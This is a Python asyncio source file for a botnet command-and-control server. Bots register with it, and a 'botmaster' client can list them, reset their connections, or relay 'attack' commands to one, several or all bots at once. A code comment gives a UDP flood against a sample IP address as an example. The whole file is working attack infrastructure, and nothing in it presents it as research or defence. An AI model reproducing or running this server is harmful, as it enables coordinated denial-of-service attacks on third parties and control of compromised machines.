import asyncio

clients = {}

async def handle_client(reader, writer):
    global clients
    client_name = None
    client_host, client_port = writer.get_extra_info('peername')
    print(f'bot connected from {client_host}:{client_port}')
    while True:
        data = await reader.read(4096)
        if not data:
            print(f'Disconnect the client {client_name}')
            if client_name in clients:
                del clients[client_name]
            break
        # register botmaster
        # list
        # rst bot1/--all/--xx 10
        # attack bot2/--all/--xx udp 10.11.45.60 1 20
        # register bot1
        message = data.decode()
        para = message.split(' ',2)
        cmd = para[0]
        if cmd == 'register':
            who = para[1]
            if client_name is None:
                client_name = who + '@' + client_host + ':' + str(client_port)
                clients[client_name] = writer
                print(f"Client registered: {client_name}")
            else:
                print(f"Client already been registered: {client_name}")
        else:
            print(f"message received from: {client_name}:{message}")
            if client_name.startswith('botmaster'):
                # clean closed clients
                to_clean = []
                for c, w in clients.items():
                    if w.is_closing():
                        to_clean.append(c)
                for k in to_clean:
                    print(f"Bot cleaned: {k}")
                    del clients[k]

                botmaster_writer = clients[client_name]
                res = None
                if cmd == 'list':
                    res = ''.join([key + '\n' for key in clients.keys()])
                    res += f'\ntotal: {len(clients)-1}'
                else:
                    bot = para[1]
                    bot_cnt = -2
                    if para[1].find('--') == 0:
                        bot = para[1][2:]
                        if bot != 'all':
                            bot_cnt = int(bot)
                        else:
                            bot_cnt = -1
                    else:
                        bot = para[1]

                    print(f'bot={bot}, bot_cnt={bot_cnt}')
                    if bot_cnt == -2 and bot not in clients.keys():
                        res = f'{bot} not found'
                    if cmd == 'rst':
                        bot_cmd = 'rst ' + para[2] # rst and reconnect after the specified time
                        if bot_cnt == -2:
                            bot_writer = clients[bot]
                            bot_writer.write(bot_cmd.encode())
                            await bot_writer.drain()
                            bot_writer.close()
                            #  await bot_writer.wait_closed()
                            del clients[bot]
                            res = f'{bot} connection reset'
                        else:
                            to_delete = []
                            i = 0
                            for b, w in clients.items():
                                if b.startswith('botmaster'):
                                    continue
                                if bot_cnt >= 0 and i >= bot_cnt:
                                    break
                                w.write(bot_cmd.encode())
                                await w.drain()
                                w.close()
                                #  await w.wait_closed()
                                to_delete.append(b)
                                i += 1

                            for k in to_delete:
                                print(f"Bot deleted: {k}")
                                del clients[k]
                            res = f'{i} bots connection reset'
                    elif cmd == 'attack':
                        bot_cmd = 'attack ' + para[2]
                        if bot_cnt == -2:
                            bot_writer = clients[bot]
                            bot_writer.write(bot_cmd.encode())
                            await bot_writer.drain()
                            res = f'cmd:{bot_cmd} sent to bot:{bot}'
                        else:
                            i = 0
                            for b, w in clients.items():
                                if b.startswith('botmaster'):
                                    continue
                                if bot_cnt >= 0 and i >= bot_cnt:
                                    break
                                w.write(bot_cmd.encode())
                                await w.drain()
                                i += 1
                            res = f'cmd:{bot_cmd} sent to {i} bots'
                botmaster_writer.write(res.encode())
                await botmaster_writer.drain()


async def main():
    server = await asyncio.start_server(
        handle_client, '192.168.88.234', 9999)

    addr = server.sockets[0].getsockname()
    print(f'Serving on {addr}')

    async with server:
        await server.serve_forever()

asyncio.run(main())

